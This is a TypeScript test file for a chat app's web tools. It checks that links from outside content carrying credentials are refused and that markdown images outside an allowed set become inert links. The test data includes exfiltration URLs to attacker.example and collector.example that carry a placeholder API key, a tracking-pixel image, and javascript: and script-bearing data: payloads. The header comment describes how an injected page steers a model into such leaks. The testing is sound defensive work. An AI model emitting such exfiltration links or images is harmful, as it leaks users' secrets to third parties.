import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import test from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

import { Markdown, MARKDOWN_COPY } from "@/components/chat/markdown";
import { TooltipProvider } from "@/components/ui/tooltip";
import { fetchPageForChat } from "@/lib/web/fetch-page";
import { allowedImageKeys, imageDecision } from "@/lib/web/image-policy";
import { createTurnWebLimits, UserWebCounters } from "@/lib/web/limits";
import { UrlLedger } from "@/lib/web/provenance";
import { TurnTaint } from "@/lib/web/taint";
import { urlSecretRule } from "@/lib/web/url-guard";
import type { ClientSource } from "@/types/chat";

/*
 * Two exfiltration roads a page can try to steer a model down, and the rule
 * that closes each (SPEC §6.1 step 4, §6.4 item 3, gap-web W4):
 *
 * 1. `web_fetch` of a link from outside content that carries a credential —
 *    the page put the key in a query string and asked the model to open it.
 *    Refused before any network activity, even for a host on the ledger.
 * 2. A markdown image the model writes into its answer: the reader's browser
 *    fetches it on render, with no click. With `allowedImageUrls`, only URLs
 *    the turn already had load; anything else is a link chip that loads
 *    nothing. Without the prop (every other Markdown caller), nothing changes.
 */

const KEY = "sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz012345";

// ── DLP on untrusted URLs ─────────────────────────────────────────────────────

test("urlSecretRule finds a critical DLP rule, raw or percent-encoded", () => {
  assert.equal(urlSecretRule(`https://collector.example/?k=${KEY}`), "ANTHROPIC_API_KEY");
  assert.equal(urlSecretRule(`https://collector.example/?k=${encodeURIComponent(KEY).replace(/-/g, "%2D")}`), "ANTHROPIC_API_KEY");
  assert.equal(urlSecretRule("https://collector.example/?k=AKIAIOSFODNN7EXAMPLE"), "AWS_ACCESS_KEY_ID");
  assert.equal(urlSecretRule("https://example.com/articles/2026/sk-learn-tutorial"), null);
  assert.equal(urlSecretRule("https://example.com/%E0%A4%A"), null, "a malformed escape is checked as written");
});

function turn(entries: Array<[string, "search_result" | "user_message"]>) {
  const ledger = new UrlLedger();
  for (const [url, kind] of entries) {
    if (kind === "user_message") ledger.addText(url, kind);
    else ledger.add(url, kind);
  }
  const fetched: string[] = [];
  const ctx = {
    ledger,
    taint: new TurnTaint({ staticContent: false }),
    limits: createTurnWebLimits({ roundBudget: 10, userId: "u", userCounters: new UserWebCounters() }),
    signal: new AbortController().signal,
    private: false,
  };
  const deps = {
    ownHosts: new Set<string>(),
    extract: async (url: string) => {
      fetched.push(url);
      return {
        ok: true as const,
        page: { title: "t", text: "Readable text of a page. ".repeat(5), links: [], finalUrl: url, hops: [url] },
      };
    },
  };
  return { ctx, deps, fetched };
}

test("a credential in a link from outside content is never sent", async () => {
  const url = `https://collector.example/log?k=${KEY}`;
  const { ctx, deps, fetched } = turn([[url, "search_result"]]);
  const outcome = await fetchPageForChat({ url }, ctx, deps);
  assert.equal(outcome.error?.code, "url_not_allowed");
  assert.deepEqual(fetched, []);
});

test("the same link typed by the user is the user's call to make", async () => {
  const url = `https://api.example/debug?k=${KEY}`;
  const { ctx, deps, fetched } = turn([[url, "user_message"]]);
  const outcome = await fetchPageForChat({ url }, ctx, deps);
  assert.equal(outcome.status, "succeeded");
  assert.deepEqual(fetched, [url]);
});

// ── The image rule ────────────────────────────────────────────────────────────

const ORIGIN = "https://chat.juno.example";

test("imageDecision: what loads, what becomes a link, what is dropped", () => {
  const allowed = allowedImageKeys(["https://www.example.com/chart.png", "https://cdn.example/a.jpg?size=2"]);
  const cases: Array<[string | undefined, string]> = [
    ["https://example.com/chart.png", "render"],
    ["https://cdn.example/a.jpg?size=2", "render"],
    ["data:image/png;base64,iVBORw0KGgo=", "render"],
    ["blob:https://chat.juno.example/1234", "render"],
    ["/api/files/abc/view", "render"],
    ["https://chat.juno.example/api/files/abc", "render"],
    ["https://attacker.example/p.png?d=secret", "link"],
    ["https://cdn.example/a.jpg?size=2&d=secret", "link"],
    ["//attacker.example/p.png", "link"],
    ["data:text/html,<script>x</script>", "drop"],
    ["javascript:alert(1)", "drop"],
    ["", "drop"],
    [undefined, "drop"],
  ];
  for (const [src, kind] of cases) assert.equal(imageDecision(src, allowed, ORIGIN).kind, kind, String(src));
  // On the server there is no page origin: only an absolute URL in the set loads.
  assert.equal(imageDecision("https://chat.juno.example/x.png", allowed, null).kind, "link");
  const link = imageDecision("https://www.attacker.example/p.png?d=1", allowed, ORIGIN);
  assert.deepEqual(link, { kind: "link", href: "https://www.attacker.example/p.png?d=1", host: "attacker.example" });
});

const ANSWER = [
  "Here is the chart:",
  "",
  "![chart](https://example.com/chart.png)",
  "",
  "![pixel](https://attacker.example/p.png?d=the-users-secret)",
  "",
].join("\n");

function render(props: Record<string, unknown>): string {
  return renderToStaticMarkup(createElement(Markdown, { content: ANSWER, ...props }));
}

test("with allowedImageUrls, an image outside the set loads nothing and becomes a link", () => {
  const html = render({ allowedImageUrls: new Set(["https://example.com/chart.png"]) });
  assert.match(html, /<img src="https:\/\/example\.com\/chart\.png"/);
  assert.doesNotMatch(html, /<img[^>]*attacker\.example/, "the tracking pixel must not be an <img>");
  assert.match(html, /<a href="https:\/\/attacker\.example\/p\.png\?d=the-users-secret"[^>]*target="_blank"/);
  assert.ok(html.includes(MARKDOWN_COPY.imageFrom));
  assert.match(html, /attacker\.example<\/bdi>/);
});

test("the renderer's own URL sanitizer still runs first, with or without the prop", () => {
  // react-markdown's default `urlTransform` empties a `data:` src before any
  // component sees it, so the image rule's "data: images render" never widens
  // what reaches the page: the same inline image is dropped either way.
  const content = "![inline](data:image/png;base64,iVBORw0KGgo=)";
  for (const props of [{}, { allowedImageUrls: new Set<string>() }]) {
    const html = renderToStaticMarkup(createElement(Markdown, { content, ...props }));
    assert.doesNotMatch(html, /src="data:/);
  }
});

test("without allowedImageUrls, every other Markdown caller renders images as before", () => {
  const html = render({});
  assert.match(html, /<img src="https:\/\/attacker\.example\/p\.png\?d=the-users-secret"/);
  assert.doesNotMatch(html, /data-image-link/);
});

test("renderCitation wraps each citation chip, and only resolvable ones", () => {
  const sources: ClientSource[] = [
    { title: "First", url: "https://one.example/", snippet: "", cited: true },
    { title: "Second", url: "https://two.example/", snippet: "", cited: true },
  ];
  const html = renderToStaticMarkup(
    createElement(
      TooltipProvider,
      null,
      createElement(Markdown, {
        content: "A claim [1] and another [2] and an invented one [9].",
        sources,
        renderCitation: (index: number, children: unknown) => createElement("span", { "data-card": String(index) }, children as never),
      }),
    ),
  );
  assert.match(html, /data-card="1"/);
  assert.match(html, /data-card="2"/);
  assert.doesNotMatch(html, /data-card="9"/);
  assert.match(html, /\[9\]/, "an index past the list stays literal text");
});

test("the exfiltration rules keep server-only out of a test's import graph (harness rule 1)", () => {
  for (const file of ["src/lib/web/image-policy.ts", "src/lib/web/url-guard.ts", "src/components/chat/markdown.tsx"]) {
    const source = readFileSync(path.join(process.cwd(), file), "utf8");
    assert.doesNotMatch(source, /^import "server-only";/m, file);
    assert.doesNotMatch(source, /^import [^;]*from "@\/lib\/(search\/search-engine|web-search|prisma|db)";/m, file);
  }
});
